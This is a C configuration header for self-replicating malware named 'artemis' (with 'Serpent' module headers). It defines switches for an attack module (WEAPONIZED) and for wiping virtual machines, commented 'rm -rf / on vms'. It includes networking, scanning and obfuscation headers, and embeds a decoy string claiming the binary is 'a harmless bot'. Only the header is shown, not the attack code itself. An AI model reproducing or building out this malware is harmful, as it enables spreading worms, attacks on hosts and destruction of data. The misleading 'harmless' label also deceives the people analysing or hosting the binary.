#pragma once

#define _GNU_SOURCE

#undef WEAPONIZED // Has attk.c
#undef HURTVMS // rm -rf / on vms

/* Version */
#define MAIN_VERSION "1.0"

// Malware name when observeed
#define MAIN_NAME "artemis\0"

// Default readable text in ELF file
#define MAIN_BOTINFO "Artemis is a harmless bot that just replicates!"

/* Normal headers */
#include <arpa/inet.h>
#include <ctype.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>

/* Type definitons and defines */

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

/* Serpent headers */
#include "func.h"
#include "comm.h"
#include "debug.h"
#include "ipv4.h"
#include "obfsc.h"
#include "process.h"
#include "rand.h"
#include "scan.h"

#ifdef WEAPONIZED
#include "serpent_attk.h"
#endif
